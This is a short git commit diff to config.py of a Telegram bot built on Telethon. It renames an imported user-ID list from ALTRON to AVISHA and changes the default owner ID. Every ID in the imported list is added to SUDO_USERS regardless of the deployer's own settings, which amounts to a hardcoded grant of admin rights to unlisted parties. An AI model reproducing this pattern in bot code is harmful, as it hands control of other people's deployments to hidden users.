60b154a228792ba625f09f6e28edc9559e38dce6
『ᴀғᴋ』﹤/3 『ᴏʏᴇ_ᴄʀᴜsʜ』 <146160310+tinaarobot@users.noreply.github.com>
2024-04-12 23:09:19 +0530

    Update config.py

--- config.py
+++ config.py
@@ -3,7 +3,7 @@ import logging
 from telethon import TelegramClient
 
 from os import getenv
-from ROYEDITX.data import ALTRON
+from ROYEDITX.data import AVISHA
 
 
 logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s', level=logging.WARNING)
@@ -18,9 +18,9 @@ HEROKU_API_KEY = getenv("HEROKU_API_KEY", None)
 BOT_TOKEN = getenv("BOT_TOKEN", default=None)
 
 SUDO_USERS = list(map(lambda x: int(x), getenv("SUDO_USERS", default="5518687442").split()))
-for x in ALTRON:
+for x in AVISHA:
     SUDO_USERS.append(x)
-OWNER_ID = int(getenv("OWNER_ID", default="6079943111"))
+OWNER_ID = int(getenv("OWNER_ID", default="6922271843"))
 SUDO_USERS.append(OWNER_ID)
 
 
